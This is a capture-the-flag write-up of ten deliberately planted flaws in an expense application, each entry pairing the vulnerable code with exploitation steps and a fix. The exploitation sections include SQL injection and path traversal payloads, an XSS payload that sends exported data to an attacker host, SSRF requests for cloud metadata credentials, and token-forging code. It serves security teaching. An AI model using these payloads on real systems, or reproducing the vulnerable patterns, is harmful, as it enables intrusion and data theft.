# ExpenseFlow CTF — Vulnerability Writeup

This document details all 10 vulnerabilities embedded in the ExpenseFlow application. Each entry covers what the vulnerability is, where it lives in the code, why it exists, how to exploit it, the business impact, and how to fix it.

---

## Vulnerability 1: SQL Injection in Expense Search

**Severity:** Critical
**Difficulty:** Medium (200 pts)
**OWASP Category:** A03:2021 — Injection
**Location:** `app/routes/expenses._index.tsx` — `loader` function (lines building the SQL query)

### Description

The expense search/filter functionality constructs SQL queries using string interpolation instead of parameterized queries. The `q`, `category`, and `status` query parameters are concatenated directly into the SQL string.

### Vulnerable Code

```typescript
if (search) {
  conditions.push(`(e.title LIKE '%${search}%' OR e.description LIKE '%${search}%')`);
}
if (category) {
  conditions.push(`e.category = '${category}'`);
}
```

### Exploitation

Navigate to `/expenses?q=' UNION SELECT id,email,password_hash,role,name,department,created_at,NULL,NULL,NULL,NULL,NULL,NULL FROM users--` to extract user credentials.

A simpler test: `/expenses?q=' OR '1'='1` returns all expenses regardless of ownership.

### Impact

Full database compromise. Attacker can read all tables, extract password hashes, modify data, or in some SQLite configurations, write to the filesystem.

### Fix

Use parameterized queries:
```typescript
if (search) {
  conditions.push(`(e.title LIKE ? OR e.description LIKE ?)`);
  params.push(`%${search}%`, `%${search}%`);
}
```

---

## Vulnerability 2: Stored Cross-Site Scripting (XSS) via Expense Description

**Severity:** High
**Difficulty:** Easy (100 pts)
**OWASP Category:** A03:2021 — Injection
**Location:** `app/routes/expenses.$id.tsx` — component render

### Description

Expense descriptions are rendered using React's `dangerouslySetInnerHTML`, which bypasses React's built-in XSS protections. The description field is user-controlled and stored in the database without sanitization.

### Vulnerable Code

```tsx
<div
  className="mt-2 text-sm text-gray-700 prose max-w-none"
  dangerouslySetInnerHTML={{ __html: expense.description || "<em>No description</em>" }}
/>
```

### Exploitation

Create a new expense with a description like:
```html
<img src=x onerror="fetch('/api/export').then(r=>r.text()).then(d=>fetch('https://attacker.com/steal?data='+btoa(d)))">
```

When a manager views this expense for approval, the script executes in their browser context.

### Impact

Session hijacking, data exfiltration, actions performed as the victim user (including approving expenses or managing users if the victim is an admin).

### Fix

Remove `dangerouslySetInnerHTML` and render the description as plain text, or sanitize with a library like DOMPurify.

---

## Vulnerability 3: Insecure Direct Object Reference (IDOR) on Expense Details

**Severity:** High
**Difficulty:** Easy (100 pts)
**OWASP Category:** A01:2021 — Broken Access Control
**Location:** `app/routes/expenses.$id.tsx` — `loader` and `action` functions

### Description

The expense detail page verifies that the user is authenticated but does not verify that the authenticated user owns the expense or has permission to view it. Any logged-in user can view and delete any expense by changing the ID in the URL.

### Vulnerable Code

```typescript
export async function loader({ params, request }: LoaderFunctionArgs) {
  await requireUser(request);  // Only checks authentication, not authorization
  const expense = db.prepare("SELECT ... WHERE e.id = ?").get(params.id);
  // No check: expense.user_id === user.id
}
```

The `action` function (delete) has the same issue — it deletes any expense without ownership verification.

### Exploitation

1. Log in as `john@expenseflow.io`
2. Navigate to `/expenses/4` (an expense belonging to another user)
3. View full details including submitter name, email, and department
4. Submit the delete form to remove another user's expense

### Impact

Unauthorized access to confidential expense data. Ability to delete other users' expenses, disrupting business operations and audit trails.

### Fix

Add ownership checks:
```typescript
const user = await requireUser(request);
if (expense.user_id !== user.id && user.role === 'employee') {
  throw new Response("Forbidden", { status: 403 });
}
```

---

## Vulnerability 4: Mass Assignment / Privilege Escalation via Profile Update

**Severity:** Critical
**Difficulty:** Hard (300 pts)
**OWASP Category:** A01:2021 — Broken Access Control
**Location:** `app/routes/profile.tsx` — `action` function

### Description

The profile update action iterates over all submitted form data and dynamically constructs an UPDATE query. Since it processes every form field without an allowlist, an attacker can add arbitrary fields to the form submission — including `role`.

### Vulnerable Code

```typescript
const updates: Record<string, any> = {};
for (const [key, value] of formData.entries()) {
  if (key !== "intent" && value) {
    updates[key] = value;
  }
}
const fields = Object.keys(updates);
const setClause = fields.map((f) => `${f} = ?`).join(", ");
db.prepare(`UPDATE users SET ${setClause} WHERE id = ?`).run(...values, user.id);
```

### Exploitation

Using browser dev tools or curl, add a hidden field `role=admin` to the profile update form submission:

```bash
curl -X POST http://localhost:3000/profile \
  -H "Cookie: __session=<session_cookie>" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=John+Smith&email=john@expenseflow.io&department=Engineering&role=admin"
```

After this request, the user's role is changed to `admin`, granting full administrative access.

### Impact

Complete privilege escalation. Any authenticated user can make themselves an admin, gaining access to approve expenses, manage users, and access all data.

### Fix

Use an explicit allowlist of updatable fields:
```typescript
const allowed = ["name", "email", "department"];
const updates: Record<string, any> = {};
for (const key of allowed) {
  const value = formData.get(key);
  if (value) updates[key] = value;
}
```

---

## Vulnerability 5: Race Condition in Expense Approval (Double Reimbursement)

**Severity:** High
**Difficulty:** Hard (300 pts)
**OWASP Category:** A04:2021 — Insecure Design
**Location:** `app/routes/api.expenses.ts` and `app/routes/admin._index.tsx` — `action` functions

### Description

The expense approval flow follows a check-then-act pattern: it first reads the expense status, verifies it's "pending," then updates it. Between the check and the update, a concurrent request can also pass the check, leading to duplicate reimbursement entries.

### Vulnerable Code

```typescript
// Read
const expense = db.prepare("SELECT * FROM expenses WHERE id = ?").get(expenseId);
if (expense.status !== "pending") {
  return json({ error: "Expense already processed" });
}
// Gap: another request can read "pending" here too

// Write
db.prepare("UPDATE expenses SET status = 'approved' ...").run(...);
db.prepare("INSERT INTO reimbursements (expense_id, amount) VALUES (?, ?)").run(...);
```

Both the admin page and the API endpoint have this pattern.

### Exploitation

Send two concurrent approval requests for the same expense:

```bash
# Terminal 1 & 2 simultaneously:
curl -X POST http://localhost:3000/admin \
  -H "Cookie: __session=<manager_cookie>" \
  -d "expense_id=3&intent=approve"
```

If timed correctly, both requests pass the `status !== "pending"` check before either writes, resulting in two reimbursement records for the same expense.

### Impact

Financial loss through duplicate reimbursements. An insider could exploit this to get paid twice for a single expense.

### Fix

Use a database transaction with a SELECT FOR UPDATE pattern, or use an atomic UPDATE with a WHERE clause:
```typescript
const result = db.prepare(
  "UPDATE expenses SET status = 'approved', approved_by = ? WHERE id = ? AND status = 'pending'"
).run(user.id, expenseId);
if (result.changes === 0) {
  return json({ error: "Already processed" });
}
```

---

## Vulnerability 6: Path Traversal in Receipt Download

**Severity:** High
**Difficulty:** Medium (200 pts)
**OWASP Category:** A01:2021 — Broken Access Control
**Location:** `app/routes/api.receipt.ts` — `loader` function

### Description

The receipt download endpoint takes a `file` query parameter and joins it directly with the receipts directory path. No validation prevents directory traversal sequences (`../`).

### Vulnerable Code

```typescript
const file = url.searchParams.get("file");
const filePath = path.join(process.cwd(), "data", "receipts", file);
// No check for path traversal — "../" sequences are preserved by path.join
```

### Exploitation

```
GET /api/receipt?file=../../../etc/passwd
GET /api/receipt?file=../../.env
GET /api/receipt?file=../expenseflow.db
```

The last example is particularly dangerous as it downloads the entire SQLite database, which contains password hashes and all application data.

### Impact

Arbitrary file read on the server. Exposure of sensitive configuration (secrets, database credentials), source code, and full database contents.

### Fix

Validate that the resolved path stays within the receipts directory:
```typescript
const receiptsDir = path.join(process.cwd(), "data", "receipts");
const filePath = path.resolve(receiptsDir, file);
if (!filePath.startsWith(receiptsDir)) {
  throw new Response("Invalid file path", { status: 400 });
}
```

---

## Vulnerability 7: Broken Access Control on User Management

**Severity:** High
**Difficulty:** Medium (200 pts)
**OWASP Category:** A01:2021 — Broken Access Control
**Location:** `app/routes/admin.users.tsx` — `loader` and `action` functions

### Description

The admin user management page (`/admin/users`) uses `requireUser()` instead of `requireAdmin()`. This means any authenticated user — not just admins — can access the full user list, change user roles, and delete users.

The navigation only shows the "Admin" link for managers/admins (client-side check), but the server-side route is accessible to everyone.

### Vulnerable Code

```typescript
export async function loader({ request }: LoaderFunctionArgs) {
  await requireUser(request);  // Should be requireAdmin(request)
  const users = db.prepare("SELECT id, email, name, role, ...").all();
}

export async function action({ request }: ActionFunctionArgs) {
  await requireUser(request);  // Same issue
}
```

Compare with `admin._index.tsx` which correctly uses `requireManager()`.

### Exploitation

Log in as any employee and navigate directly to `/admin/users`. Full user list with emails, roles, and expense totals is displayed. The attacker can then change any user's role or delete accounts.

### Impact

Complete user management compromise. An attacker can escalate their own privileges, demote admins, or delete user accounts.

### Fix

Replace `requireUser` with `requireAdmin` in both the loader and action.

---

## Vulnerability 8: Server-Side Request Forgery (SSRF) via Receipt Import

**Severity:** Medium
**Difficulty:** Hard (300 pts)
**OWASP Category:** A10:2021 — Server-Side Request Forgery
**Location:** `app/routes/expenses.new.tsx` — `action` function, and `app/routes/api.import-receipt.ts`

### Description

The "Receipt URL" feature on the new expense form and the dedicated import API both fetch arbitrary URLs server-side using `fetch()` without any URL validation. An attacker can use the server as a proxy to scan internal networks, access cloud metadata services, or interact with internal services.

### Vulnerable Code

```typescript
const response = await fetch(receiptUrl);  // No URL validation whatsoever
const buffer = Buffer.from(await response.arrayBuffer());
```

### Exploitation

```bash
# Access cloud metadata
curl -X POST http://localhost:3000/api/import-receipt \
  -H "Cookie: __session=<cookie>" \
  -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Scan internal network
curl -X POST http://localhost:3000/api/import-receipt \
  -d "url=http://192.168.1.1:8080/admin"

# Access internal services
curl -X POST http://localhost:3000/api/import-receipt \
  -d "url=http://localhost:6379/INFO"
```

### Impact

Internal network reconnaissance, access to cloud provider metadata (potentially exposing IAM credentials), interaction with internal services that are not internet-accessible.

### Fix

Validate URLs against an allowlist of schemes and hosts, block private/internal IP ranges:
```typescript
const parsed = new URL(receiptUrl);
if (!["http:", "https:"].includes(parsed.protocol)) throw new Error("Invalid protocol");
// Block private IPs, metadata endpoints, localhost, etc.
```

---

## Vulnerability 9: Insecure Password Reset Token Generation

**Severity:** Medium
**Difficulty:** Medium (200 pts)
**OWASP Category:** A02:2021 — Cryptographic Failures
**Location:** `app/auth.server.ts` — `createPasswordResetToken` function

### Description

Password reset tokens are generated by computing `MD5(email + "expenseflow-reset-2024")`. Since the email is known and the salt is static and hardcoded in the source code, the token is completely deterministic and predictable. Additionally, tokens never expire.

### Vulnerable Code

```typescript
const token = crypto
  .createHash("md5")
  .update(email + "expenseflow-reset-2024")
  .digest("hex");
```

### Exploitation

An attacker who knows a user's email can compute the reset token without ever requesting a reset:

```javascript
const crypto = require("crypto");
const token = crypto.createHash("md5")
  .update("admin@expenseflow.io" + "expenseflow-reset-2024")
  .digest("hex");
// Navigate to /reset-password/<token> and set a new password
```

The attacker doesn't even need the password reset email — they can generate valid tokens for any user.

### Impact

Complete account takeover for any user whose email is known. Particularly devastating for admin accounts.

### Fix

Use cryptographically random tokens:
```typescript
const token = crypto.randomBytes(32).toString("hex");
```
Also add token expiration (e.g., 1 hour) and delete tokens after use.

---

## Vulnerability 10: Information Disclosure via CSV Export

**Severity:** Medium
**Difficulty:** Easy (100 pts)
**OWASP Category:** A01:2021 — Broken Access Control
**Location:** `app/routes/api.export.ts` — `loader` function

### Description

The CSV export endpoint returns ALL expenses from ALL users, regardless of who makes the request. A regular employee can download the complete expense history of the entire organization, including other employees' names, email addresses, expense descriptions, and amounts.

### Vulnerable Code

```typescript
export async function loader({ request }: LoaderFunctionArgs) {
  await requireUser(request);  // Authenticated but no role/scope check

  const expenses = db.prepare(
    `SELECT e.*, u.name as submitter_name, u.email as submitter_email
     FROM expenses e JOIN users u ON e.user_id = u.id
     ORDER BY e.created_at DESC`
  ).all();
  // No WHERE clause filtering by user — exports everything
}
```

### Exploitation

Log in as any employee and navigate to `/api/export`. The CSV download contains every expense in the system with full submitter details.

### Impact

Exposure of confidential financial data, employee PII (names, emails), and business information (client names in descriptions, travel patterns, spending habits). Could violate data protection regulations.

### Fix

Filter by user for non-admin roles:
```typescript
const user = await requireUser(request);
let query = `SELECT e.*, u.name, u.email FROM expenses e JOIN users u ON e.user_id = u.id`;
if (user.role === "employee") {
  query += ` WHERE e.user_id = ?`;
  expenses = db.prepare(query).all(user.id);
} else {
  expenses = db.prepare(query).all();
}
```

---

## Summary Table

| # | Vulnerability | Severity | Difficulty | Location | OWASP |
|---|---|---|---|---|---|
| 1 | SQL Injection | Critical | Medium | `expenses._index.tsx` | A03 Injection |
| 2 | Stored XSS | High | Easy | `expenses.$id.tsx` | A03 Injection |
| 3 | IDOR | High | Easy | `expenses.$id.tsx` | A01 Broken Access Control |
| 4 | Mass Assignment | Critical | Hard | `profile.tsx` | A01 Broken Access Control |
| 5 | Race Condition | High | Hard | `api.expenses.ts` / `admin._index.tsx` | A04 Insecure Design |
| 6 | Path Traversal | High | Medium | `api.receipt.ts` | A01 Broken Access Control |
| 7 | Broken Access Control | High | Medium | `admin.users.tsx` | A01 Broken Access Control |
| 8 | SSRF | Medium | Hard | `expenses.new.tsx` / `api.import-receipt.ts` | A10 SSRF |
| 9 | Insecure Password Reset | Medium | Medium | `auth.server.ts` | A02 Cryptographic Failures |
| 10 | Information Disclosure | Medium | Easy | `api.export.ts` | A01 Broken Access Control |

**Total Points Available:** 2,000

### Difficulty Distribution
- **Easy (100 pts each):** #2, #3, #10 = 300 pts
- **Medium (200 pts each):** #1, #6, #7, #9 = 800 pts
- **Hard (300 pts each):** #4, #5, #8 = 900 pts
